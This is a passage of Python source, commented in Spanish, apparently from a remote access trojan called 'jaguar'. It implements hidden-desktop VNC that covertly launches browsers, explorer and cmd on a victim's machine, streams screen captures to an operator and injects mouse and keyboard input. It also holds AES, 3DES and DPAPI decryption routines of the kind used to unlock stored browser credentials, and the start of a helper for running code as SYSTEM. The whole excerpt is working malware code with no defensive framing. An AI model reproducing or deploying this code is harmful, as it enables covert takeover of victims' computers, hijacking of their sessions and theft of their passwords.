    return (por_pid or por_clase or [None])[0]


def _hvnc_render_widget(hwnd):
    if not hwnd:
        return None
    encontrados = []

    def cb(h, lparam):
        try:
            cls = ctypes.create_unicode_buffer(256)
            _u32.GetClassNameW(h, cls, 256)
            if cls.value in _CLASES_RENDER:
                r = _RECT()
                _u32.GetWindowRect(h, ctypes.byref(r))
                if (r.right - r.left) > 200 and (r.bottom - r.top) > 150:
                    encontrados.append((_CLASES_RENDER.index(cls.value), h))
        except Exception:
            pass
        return True

    _u32.EnumChildWindows(hwnd, _ENUMPROC(cb), 0)
    if not encontrados:
        return hwnd
    encontrados.sort(key=lambda t: t[0])
    return encontrados[0][1]


def _hvnc_activar():
    if _HVNC.get("activado") or not _HVNC.get("hwnd"):
        return
    try:
        hwnd = _HVNC["hwnd"]
        rw = _HVNC.get("rw") or _hvnc_render_widget(hwnd) or hwnd
        _HVNC["rw"] = rw
        _u32.PostMessageW(hwnd, 0x0006, 1, 0)
        _u32.PostMessageW(hwnd, 0x0007, rw, 0)
        _u32.PostMessageW(rw, 0x0006, 1, 0)
        _u32.PostMessageW(rw, 0x0007, rw, 0)
        _u32.PostMessageW(hwnd, 0x000F, 0, 0)
        _HVNC["activado"] = True
    except Exception:
        pass


def _hvnc_destino(x, y):
    hwnd = _HVNC.get("hwnd")
    if not hwnd:
        return None, x, y
    actual, cx, cy = hwnd, int(x), int(y)
    for _ in range(8):
        try:
            hijo = _u32.ChildWindowFromPointEx(actual, _POINT(cx, cy), 0)
        except Exception:
            break
        if not hijo or hijo == actual:
            break
        p = _POINT(cx, cy)
        try:
            _u32.MapWindowPoints(actual, hijo, ctypes.byref(p), 1)
        except Exception:
            pass
        cx, cy = p.x, p.y
        actual = hijo
    return actual, cx, cy


def _hvnc_foco():
    hwnd = _HVNC.get("rw") or _HVNC.get("hwnd")
    if not hwnd:
        return None
    try:
        tid = _u32.GetWindowThreadProcessId(hwnd, None)
        gti = _GUITHREADINFO()
        gti.cbSize = ctypes.sizeof(_GUITHREADINFO)
        if _u32.GetGUIThreadInfo(tid, ctypes.byref(gti)) and gti.hwndFocus:
            return gti.hwndFocus
    except Exception:
        pass
    return hwnd


def _hvnc_trabajo_win(a):
    hdesk = _hvnc_crear_desktop()
    if not hdesk:
        _HVNC["estado"] = "error"
        _HVNC["error"] = "no se pudo crear el desktop oculto"
        return
    _u32.SetThreadDesktop(hdesk)
    if a.get("shell"):
        try:
            win = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe")
            _hvnc_crear(win, f'"{win}"', DESKTOP_NAME)
        except Exception:
            pass
    if a.get("cmd"):
        try:
            cmd = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32",
                               "cmd.exe")
            _hvnc_crear(cmd, f'"{cmd}" /k cd /d %USERPROFILE%', DESKTOP_NAME)
        except Exception:
            pass
    try:
        _HVNC["pid"], _HVNC["perfil"] = _hvnc_lanzar_win(_HVNC["navegador"])
    except Exception as e:
        _HVNC["error"] = str(e)
        _HVNC["estado"] = "error"
        _log("HVNC", f"ERROR lanzando: {e}")
        return
    for _ in range(75):
        time.sleep(0.4)
        h = _hvnc_buscar_ventana()
        if h:
            _HVNC["hwnd"] = h
            _HVNC["rw"] = _hvnc_render_widget(h)
            _HVNC["estado"] = "activo"
            _hvnc_activar()
            return
    _HVNC["estado"] = "sin_ventana"


def _gdi_liberar():
    try:
        if _GDI["mdc"]:
            if _GDI["viejo"]:
                _g32.SelectObject(_GDI["mdc"], _GDI["viejo"])
            _g32.DeleteDC(_GDI["mdc"])
        if _GDI["bmp"]:
            _g32.DeleteObject(_GDI["bmp"])
    except Exception:
        pass
    _GDI.update({"w": 0, "h": 0, "mdc": 0, "bmp": 0, "viejo": 0, "buf": None})


def _gdi_asegurar(hdc, w, h):
    if _GDI["w"] != w or _GDI["h"] != h or not _GDI["mdc"]:
        _gdi_liberar()
        mdc = _g32.CreateCompatibleDC(hdc)
        bmp = _g32.CreateCompatibleBitmap(hdc, w, h)
        viejo = _g32.SelectObject(mdc, bmp)
        _GDI.update({"w": w, "h": h, "mdc": mdc, "bmp": bmp, "viejo": viejo,
                     "buf": ctypes.create_string_buffer(w * h * 4)})


def _es_negro(datos, paso=8192):
    try:
        for i in range(0, len(datos), paso):
            if datos[i]:
                return False
        return True
    except Exception:
        return False


def _hvnc_captura_win(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd or not _u32.IsWindow(hwnd):
        return {"w": 1, "h": 1, "b64": ""}
    _HVNC["hwnd"] = hwnd
    if not _HVNC.get("rw"):
        _HVNC["rw"] = _hvnc_render_widget(hwnd)
    r = _RECT()
    _u32.GetWindowRect(hwnd, ctypes.byref(r))
    w, h = r.right - r.left, r.bottom - r.top
    if w <= 0 or h <= 0:
        return {"w": 1, "h": 1, "b64": ""}
    hdc = _u32.GetWindowDC(hwnd)
    datos = b""
    try:
        _gdi_asegurar(hdc, w, h)
        mdc, bmp, buf = _GDI["mdc"], _GDI["bmp"], _GDI["buf"]
        bmi = _BITMAPINFO()
        bmi.bmiHeader.biSize = ctypes.sizeof(_BIH)
        bmi.bmiHeader.biWidth = w
        bmi.bmiHeader.biHeight = -h
        bmi.bmiHeader.biPlanes = 1
        bmi.bmiHeader.biBitCount = 32

        def _pintar(destino):
            ok = _u32.PrintWindow(destino, mdc, PW_RENDERFULLCONTENT)
            if not ok:
                _u32.PrintWindow(destino, mdc, 0)
            _g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bmi), 0)
            return bytes(buf.raw)

        datos = _pintar(hwnd)
        if _es_negro(datos) and _HVNC.get("rw") and _HVNC["rw"] != hwnd:
            datos = _pintar(_HVNC["rw"])
        if _es_negro(datos):
            _g32.BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
            _g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bmi), 0)
            datos = bytes(buf.raw)
    finally:
        _u32.ReleaseDC(hwnd, hdc)
    calidad = int(_HVNC_CFG.get("calidad", 55))
    escala = float(_HVNC_CFG.get("escala", 0.75)) or 1.0
    raw = b""
    try:
        import cv2
        import numpy as np
        arr = np.frombuffer(datos, dtype=np.uint8).reshape((h, w, 4))[:, :, :3]
        if escala != 1.0:
            arr = cv2.resize(arr, None, fx=escala, fy=escala,
                             interpolation=cv2.INTER_LINEAR)
        ok, jpg = cv2.imencode(".jpg", arr, [int(cv2.IMWRITE_JPEG_QUALITY), calidad])
        raw = jpg.tobytes() if ok else b""
    except Exception:
        try:
            from PIL import Image
            img = Image.frombuffer("RGB", (w, h), datos, "raw", "BGRX", 0, 1)
            if escala != 1.0:
                img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
            bio = io.BytesIO()
            img.save(bio, "JPEG", quality=calidad)
            raw = bio.getvalue()
        except Exception:
            raw = b""
    if not raw:
        return {"w": w, "h": h, "b64": ""}
    huella = hashlib.md5(raw).digest()
    if huella == _HVNC.get("hash") and not a.get("forzar"):
        return {"w": w, "h": h, "b64": "", "sin_cambios": True}
    _HVNC["hash"] = huella
    return {"w": w, "h": h, "b64": base64.b64encode(raw).decode()}


def _hvnc_raton_win(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd:
        return {"estado": "sin ventana"}
    _HVNC["hwnd"] = hwnd
    _hvnc_activar()
    accion = a.get("accion")
    cx_in, cy_in = int(a.get("x", 0)), int(a.get("y", 0))
    pt = _POINT(cx_in, cy_in)
    _u32.ClientToScreen(hwnd, ctypes.byref(pt))
    sx, sy = pt.x, pt.y
    objetivo, cx, cy = _hvnc_destino(cx_in, cy_in)
    if not objetivo:
        objetivo, cx, cy = hwnd, cx_in, cy_in
    lp_cli = ((cy & 0xFFFF) << 16) | (cx & 0xFFFF)
    lp_scr = ((sy & 0xFFFF) << 16) | (sx & 0xFFFF)
    if accion == "move":
        _u32.PostMessageW(objetivo, 0x0200, 0, lp_cli)
    elif accion == "down":
        _u32.PostMessageW(objetivo, 0x0021, objetivo, 0)
        _u32.PostMessageW(objetivo, 0x0201, 1, lp_cli)
    elif accion == "up":
        _u32.PostMessageW(objetivo, 0x0202, 0, lp_cli)
    elif accion == "right_down":
        _u32.PostMessageW(objetivo, 0x0204, 2, lp_cli)
    elif accion == "right_up":
        _u32.PostMessageW(objetivo, 0x0205, 0, lp_cli)
    elif accion == "doble":
        _u32.PostMessageW(objetivo, 0x0203, 1, lp_cli)
    elif accion == "scroll":
        _u32.PostMessageW(objetivo, 0x020A,
                          (int(a.get("delta", 120)) & 0xFFFF) << 16, lp_scr)
    return {"estado": accion}


def _hvnc_teclado_win(a):
    objetivo = _hvnc_foco() or _HVNC.get("rw") or _HVNC.get("hwnd")
    if not objetivo:
        return {"estado": "sin ventana"}
    _hvnc_activar()
    if "vk" in a:
        vk = int(a["vk"])
        scan = _u32.MapVirtualKeyW(vk, 0)
        _u32.PostMessageW(objetivo, 0x0100, vk, (scan << 16))
        _u32.PostMessageW(objetivo, 0x0101, vk, (scan << 16) | (1 << 30) | (1 << 31))
        _u32.PostMessageW(objetivo, 0x0102, vk, (scan << 16))
    elif "texto" in a:
        for ch in a["texto"]:
            _u32.PostMessageW(objetivo, 0x0102, ord(ch), 0)
    return {"estado": "ok"}


def _hvnc_cerrar_win():
    pids = list(_HVNC_PIDS)
    if _HVNC.get("pid") and _HVNC["pid"] not in pids:
        pids.append(_HVNC["pid"])
    for p in pids:
        try:
            subprocess.run(["taskkill", "/PID", str(p), "/T", "/F"],
                           capture_output=True, text=True, **_sin_consola())
        except Exception:
            pass
    _HVNC_PIDS.clear()
    _gdi_liberar()
    hwnd = _HVNC.get("hwnd")
    try:
        if hwnd and _u32.IsWindow(hwnd):
            _u32.PostMessageW(hwnd, 0x0010, 0, 0)
    except Exception:
        pass


# -------------------------------- HVNC Linux -------------------------------
def _hvnc_trabajo_linux(a):
    exe = _HVNC["exe"]
    perfil = _HVNC.get("perfil")
    if not perfil or not os.path.isdir(perfil):
        perfil = tempfile.mkdtemp(prefix="jaguar_hvnc_")
        _HVNC["perfil"] = perfil
    es_ff = "firefox" in os.path.basename(exe).lower()
    if es_ff:
        partes = [exe, "-no-remote", "-profile", perfil,
                  "-width", "1280", "-height", "800"]
    else:
        partes = [exe, f"--user-data-dir={perfil}", "--window-size=1280,800",
                  "--no-first-run", "--no-default-browser-check",
                  "--disable-features=CalculateNativeWinOcclusion"]
    if a.get("url"):
        partes.append(a["url"])
    try:
        p = subprocess.Popen(partes, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
        _HVNC["pid"] = p.pid
        _HVNC_PIDS.append(p.pid)
        _HVNC["estado"] = "activo"
    except Exception as e:
        _HVNC["error"] = str(e)
        _HVNC["estado"] = "error"
        return
    time.sleep(3)
    if _tiene("xdotool"):
        for _ in range(20):
            try:
                r = subprocess.run(["xdotool", "search", "--onlyvisible", "--pid",
                                    str(p.pid)], capture_output=True, text=True,
                                   timeout=6)
                ids = [i for i in (r.stdout or "").split() if i.strip()]
                if ids:
                    g = subprocess.run(["xdotool", "getwindowgeometry", "--shell",
                                        ids[-1]], capture_output=True, text=True,
                                       timeout=6)
                    vals = dict(l.split("=") for l in g.stdout.splitlines() if "=" in l)
                    _HVNC["hwnd"] = {"x": int(vals.get("X", 0)),
                                     "y": int(vals.get("Y", 0)),
                                     "w": int(vals.get("WIDTH", 0)),
                                     "h": int(vals.get("HEIGHT", 0))}
                    return
            except Exception:
                pass
            time.sleep(0.5)


def _hvnc_captura_linux(a):
    cap = _captura({"formato": "jpeg",
                    "calidad": int(_HVNC_CFG.get("calidad", 55)),
                    "escala": float(_HVNC_CFG.get("escala", 0.75))})
    if not cap.get("b64"):
        return {"w": 1, "h": 1, "b64": ""}
    geo = _HVNC.get("hwnd")
    if geo and _tiene("import") and geo.get("w", 0) > 200:
        destino = os.path.join(tempfile.gettempdir(), "jaguar_hvnc.png")
        try:
            subprocess.run(["import", "-window", "root", "-crop",
                            f"{geo['w']}x{geo['h']}+{geo['x']}+{geo['y']}", destino],
                           capture_output=True, timeout=15)
            if os.path.isfile(destino) and os.path.getsize(destino) > 0:
                with open(destino, "rb") as f:
                    raw = f.read()
                return {"w": geo["w"], "h": geo["h"],
                        "b64": base64.b64encode(raw).decode()}
        except Exception:
            pass
    return cap


def _hvnc_cerrar_linux():
    for p in list(_HVNC_PIDS):
        try:
            os.kill(p, 15)
        except Exception:
            pass
    _HVNC_PIDS.clear()
    perfil = _HVNC.get("perfil")
    if perfil:
        shutil.rmtree(perfil, ignore_errors=True)
        _HVNC["perfil"] = None


# ------------------------------ HVNC dispatch ------------------------------
def _hvnc_captura(a):
    if ES_WIN:
        return _hvnc_captura_win(a)
    if ES_ANDROID:
        return _captura_android("jpeg", int(_HVNC_CFG.get("calidad", 55)),
                                float(_HVNC_CFG.get("escala", 0.75)))
    return _hvnc_captura_linux(a)


def _hvnc_raton(a):
    if ES_WIN:
        return _hvnc_raton_win(a)
    if ES_ANDROID:
        return _raton_android(a)
    return _raton_xdo(a)


def _hvnc_teclado(a):
    if ES_WIN:
        return _hvnc_teclado_win(a)
    return _teclado(a)


def _hvnc_cerrar(a):
    if ES_WIN:
        _hvnc_cerrar_win()
    else:
        _hvnc_cerrar_linux()
    _STREAM["hvnc"]["on"] = False
    _HVNC.update({"pid": None, "hwnd": None, "rw": None, "activado": False,
                  "hash": None, "estado": "idle", "error": None})
    _log("HVNC", "cerrado")
    return {"estado": "HVNC cerrado"}


def _hvnc_navegar(a):
    nav = (a.get("navegador") or _HVNC.get("navegador") or "chrome").lower()
    url = a.get("url", "")
    try:
        if ES_WIN:
            _hvnc_lanzar_win(nav, url)
        else:
            exe = _ruta_navegador(nav)
            perfil = _HVNC.get("perfil") or tempfile.mkdtemp(prefix="jaguar_hvnc_")
            _HVNC["perfil"] = perfil
            subprocess.Popen([exe, f"--user-data-dir={perfil}", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return {"estado": "navegando"}
    except Exception as e:
        return {"error": str(e)}


def _hvnc_estado(a):
    return {k: v for k, v in _HVNC.items() if k != "_sd"}


def _hvnc_opciones(a):
    for k in ("calidad", "escala", "fps"):
        if k in a:
            try:
                _HVNC_CFG[k] = float(a[k])
            except Exception:
                pass
    return {"opciones": dict(_HVNC_CFG)}


def _hvnc_stream(a):
    if "fps" in a:
        try:
            _STREAM["hvnc"]["fps"] = max(1, min(30, int(float(a["fps"]))))
        except Exception:
            pass
    on = bool(a.get("on"))
    if on and not _STREAM["hvnc"]["on"]:
        _STREAM["hvnc"]["on"] = True
        threading.Thread(target=_hvnc_stream_loop, daemon=True).start()
    elif not on:
        _STREAM["hvnc"]["on"] = False
    return {"stream": _STREAM["hvnc"]["on"], "fps": _STREAM["hvnc"]["fps"]}


def _hvnc_stream_loop():
    while _STREAM["hvnc"]["on"]:
        objetivo = 1.0 / max(1, _STREAM["hvnc"]["fps"])
        t0 = time.time()
        try:
            datos = _hvnc_captura({"forzar": True})
            if datos.get("b64"):
                _enviar_evento("hvnc_frame", datos)
        except Exception:
            pass
        dt = time.time() - t0
        if dt < objetivo:
            time.sleep(objetivo - dt)


def _captura_stream(a):
    if "fps" in a:
        try:
            _STREAM["escritorio"]["fps"] = max(1, min(30, int(float(a["fps"]))))
        except Exception:
            pass
    for k in ("calidad", "escala"):
        if k in a:
            try:
                _CAP_CFG[k] = float(a[k])
            except Exception:
                pass
    on = bool(a.get("on"))
    if on and not _STREAM["escritorio"]["on"]:
        _STREAM["escritorio"]["on"] = True
        threading.Thread(target=_captura_stream_loop, daemon=True).start()
    elif not on:
        _STREAM["escritorio"]["on"] = False
    return {"stream": _STREAM["escritorio"]["on"]}


def _captura_stream_loop():
    while _STREAM["escritorio"]["on"]:
        objetivo = 1.0 / max(1, _STREAM["escritorio"]["fps"])
        t0 = time.time()
        try:
            datos = _captura({"formato": "jpeg", "calidad": int(_CAP_CFG["calidad"]),
                              "escala": float(_CAP_CFG["escala"])})
            if datos.get("b64"):
                _enviar_evento("escritorio_frame", datos)
        except Exception:
            pass
        dt = time.time() - t0
        if dt < objetivo:
            time.sleep(objetivo - dt)


# ===========================================================================
#  Cripto simetrica pura (AES-256 GCM/CBC + 3DES) + DPAPI
# ===========================================================================
_AES_OK = False
_SB = [0] * 256
_ISB = [0] * 256
_RCON = [0] * 16


def _aes_init():
    global _AES_OK
    if _AES_OK:
        return
    exp = [0] * 256
    lg = [0] * 256

    def xt(a):
        a <<= 1
        if a & 0x100:
            a ^= 0x11B
        return a & 0xFF

    x = 1
    for i in range(255):
        exp[i] = x
        lg[x] = i
        x = xt(x) ^ x
    inv = [0] * 256
    for i in range(1, 256):
        inv[i] = exp[(255 - lg[i]) % 255]

    def rotl8(b, n):
        return ((b << n) | (b >> (8 - n))) & 0xFF

    for i in range(256):
        b = inv[i]
        s = b ^ rotl8(b, 1) ^ rotl8(b, 2) ^ rotl8(b, 3) ^ rotl8(b, 4) ^ 0x63
        _SB[i] = s
        _ISB[s] = i
    r = 1
    for i in range(16):
        _RCON[i] = r
        r = xt(r)
    _AES_OK = True


def _gm(a, b):
    r = 0
    while b:
        if b & 1:
            r ^= a
        a = ((a << 1) ^ (0x1B if a & 0x80 else 0)) & 0xFF
        b >>= 1
    return r


def _aes_claves(clave):
    _aes_init()
    nk = len(clave) // 4
    nr = nk + 6
    w = [list(clave[4 * i:4 * i + 4]) for i in range(nk)]
    i = nk
    total = 4 * (nr + 1)
    while i < total:
        temp = list(w[i - 1])
        if i % nk == 0:
            temp = temp[1:] + temp[:1]
            temp = [_SB[b] for b in temp]
            temp[0] ^= _RCON[i // nk - 1]
        elif nk > 6 and i % nk == 4:
            temp = [_SB[b] for b in temp]
        w.append([w[i - nk][j] ^ temp[j] for j in range(4)])
        i += 1
    return (w, nr)


def _aes_bloque(clave_prog, bloque):
    w, nr = clave_prog
    s = list(bloque)
    for c in range(4):
        for r in range(4):
            s[4 * c + r] ^= w[c][r]
    for rnd in range(1, nr):
        t = [0] * 16
        for c in range(4):
            for r in range(4):
                t[4 * c + r] = _SB[s[4 * ((c + r) % 4) + r]]
        for c in range(4):
            a0, a1, a2, a3 = t[4 * c:4 * c + 4]
            s[4 * c + 0] = _gm(a0, 2) ^ _gm(a1, 3) ^ a2 ^ a3
            s[4 * c + 1] = a0 ^ _gm(a1, 2) ^ _gm(a2, 3) ^ a3
            s[4 * c + 2] = a0 ^ a1 ^ _gm(a2, 2) ^ _gm(a3, 3)
            s[4 * c + 3] = _gm(a0, 3) ^ a1 ^ a2 ^ _gm(a3, 2)
        for c in range(4):
            for r in range(4):
                s[4 * c + r] ^= w[4 * rnd + c][r]
    t = [0] * 16
    for c in range(4):
        for r in range(4):
            t[4 * c + r] = _SB[s[4 * ((c + r) % 4) + r]]
    for c in range(4):
        for r in range(4):
            s[4 * c + r] = t[4 * c + r] ^ w[4 * nr + c][r]
    return bytes(s)


def _aes_cbc_descifrar(clave, iv, datos):
    prog = _aes_claves(clave)
    out = bytearray()
    prev = iv
    for i in range(0, len(datos), 16):
        blk = datos[i:i + 16]
        if len(blk) < 16:
            blk = blk + b"\x00" * (16 - len(blk))
        dec = _aes_bloque(prog, blk)
        out += bytes(a ^ b for a, b in zip(dec, prev))
        prev = blk
    if out and 0 < out[-1] <= 16:
        n = out[-1]
        if out[-n:] == bytes([n]) * n:
            out = out[:-n]
    return bytes(out)


_R128 = 0xE1000000000000000000000000000000


def _gf128_mul(x, y):
    z = 0
    v = y
    for i in range(128):
        if (x >> (127 - i)) & 1:
            z ^= v
        if v & 1:
            v = (v >> 1) ^ _R128
        else:
            v >>= 1
    return z


def _aes_ctr(prog, j0, datos):
    out = bytearray()
    c = j0
    for i in range(0, len(datos), 16):
        c = (c + 1) & ((1 << 128) - 1)
        ks = _aes_bloque(prog, c.to_bytes(16, "big"))
        blk = datos[i:i + 16]
        out += bytes(a ^ b for a, b in zip(blk, ks))
    return bytes(out)


def _aes_gcm_descifrar(clave, nonce, ct_tag):
    if len(nonce) != 12 or len(ct_tag) < 16:
        return b""
    prog = _aes_claves(clave)
    h = int.from_bytes(_aes_bloque(prog, b"\x00" * 16), "big")
    ct, tag = ct_tag[:-16], ct_tag[-16:]
    datos = ct + b"\x00" * ((16 - len(ct) % 16) % 16)
    datos += b"\x00" * 8 + (len(ct) * 8).to_bytes(8, "big")
    s = 0
    for i in range(0, len(datos), 16):
        s = _gf128_mul(s ^ int.from_bytes(datos[i:i + 16], "big"), h)
    j0 = int.from_bytes(nonce + b"\x00\x00\x00\x01", "big")
    ek = int.from_bytes(_aes_bloque(prog, j0.to_bytes(16, "big")), "big")
    if (ek ^ s) != int.from_bytes(tag, "big"):
        return b""
    return _aes_ctr(prog, j0, ct)


# --------------------------------- DES/3DES --------------------------------
_DES_IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
           62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
           57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
           61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]
_DES_FP = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
           38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
           36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
           34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]
_DES_E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13,
          12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
          24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]
_DES_P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10,
          2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]
_DES_S = [
    [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
     0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
     4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
     15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],
    [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
     3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
     0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
     13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],
    [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
     13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
     13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
     1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],
    [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
     13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
     10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
     3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],
    [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
     14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
     4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
     11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],
    [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
     10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
     9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
     4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],
    [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
     13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
     1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
     6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],
    [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
     1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
     7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
     2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
]
_DES_PC1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18,
            10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36,
            63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22,
            14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]
_DES_PC2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4,
            26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40,
            51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]
_DES_SHIFTS = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]


def _perm(bits, tabla):
    return [bits[t - 1] for t in tabla]


def _des_subclaves(clave8):
    bits = [(b >> (7 - i)) & 1 for b in clave8 for i in range(8)]
    k = _perm(bits, _DES_PC1)
    c, d = k[:28], k[28:]
    ks = []
    for s in _DES_SHIFTS:
        c = c[s:] + c[:s]
        d = d[s:] + d[:s]
        ks.append(_perm(c + d, _DES_PC2))
    return ks


def _des_f(r, k):
    x = _perm(r, _DES_E)
    x = [a ^ b for a, b in zip(x, k)]
    out = []
    for i in range(8):
        b = x[i * 6:i * 6 + 6]
        fila = (b[0] << 1) | b[5]
        col = (b[1] << 3) | (b[2] << 2) | (b[3] << 1) | b[4]
        v = _DES_S[i][fila * 16 + col]
        out += [(v >> 3) & 1, (v >> 2) & 1, (v >> 1) & 1, v & 1]
    return _perm(out, _DES_P)


def _des_bloque(bits, ks):
    b = _perm(bits, _DES_IP)
    l, r = b[:32], b[32:]
    for k in ks:
        l, r = r, [a ^ c for a, c in zip(l, _des_f(r, k))]
    return _perm(r + l, _DES_FP)


def _bits_a_bytes(bits):
    out = bytearray()
    for i in range(0, len(bits), 8):
        v = 0
        for bit in bits[i:i + 8]:
            v = (v << 1) | bit
        out.append(v)
    return bytes(out)


def _3des_cbc_descifrar(clave24, iv, datos):
    k1 = _des_subclaves(clave24[0:8])
    k2 = _des_subclaves(clave24[8:16])
    k3 = _des_subclaves(clave24[16:24])
    prev = [(b >> (7 - i)) & 1 for b in iv for i in range(8)]
    out = bytearray()
    for i in range(0, len(datos), 8):
        blk = datos[i:i + 8]
        if len(blk) < 8:
            blk = blk + b"\x00" * (8 - len(blk))
        bits = [(b >> (7 - j)) & 1 for b in blk for j in range(8)]
        d3 = _des_bloque(bits, list(reversed(k3)))
        e2 = _des_bloque(d3, k2)
        d1 = _des_bloque(e2, list(reversed(k1)))
        out += _bits_a_bytes([a ^ b for a, b in zip(d1, prev)])
        prev = bits
    if out and 0 < out[-1] <= 8:
        n = out[-1]
        if out[-n:] == bytes([n]) * n:
            out = out[:-n]
    return bytes(out)


def _dpapi(blob, entropy=None):
    if not blob or not ES_WIN:
        return blob or b""
    try:
        import ctypes
        from ctypes import wintypes

        class _BLOB(ctypes.Structure):
            _fields_ = [("cbData", wintypes.DWORD),
                        ("pbData", ctypes.POINTER(ctypes.c_char))]

        def _mk(datos):
            buf = ctypes.create_string_buffer(bytes(datos), len(datos))
            return _BLOB(len(datos), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char))), buf

        bi, _b1 = _mk(blob)
        pbe = None
        if entropy:
            be, _b2 = _mk(entropy)
            pbe = ctypes.byref(be)
        bo = _BLOB()
        ok = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(bi), None, pbe, None, None, 0, ctypes.byref(bo))
        if not ok:
            return b""
        try:
            return ctypes.string_at(bo.pbData, bo.cbData)
        finally:
            try:
                ctypes.windll.kernel32.LocalFree(bo.pbData)
            except Exception:
                pass
    except Exception:
        return b""


def _pid_de(nombre):
    try:
        if ES_WIN:
            r = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + nombre,
                                "/NH", "/FO", "CSV"],
                               capture_output=True, text=True, **_sin_consola())
            for ln in (r.stdout or "").splitlines():
                partes = [p.strip('"') for p in ln.split('","')]
                if len(partes) >= 2 and partes[0].lower() == nombre.lower():
                    return int(partes[1])
        else:
            r = subprocess.run(["pgrep", "-o", nombre.replace(".exe", "")],
                               capture_output=True, text=True, timeout=8)
            salida = (r.stdout or "").strip().splitlines()
            if salida:
                return int(salida[0])
    except Exception:
        pass
    return None


def _como_system(fn):
    if not ES_WIN:
        return fn()
    try:
        import ctypes
        from ctypes import wintypes
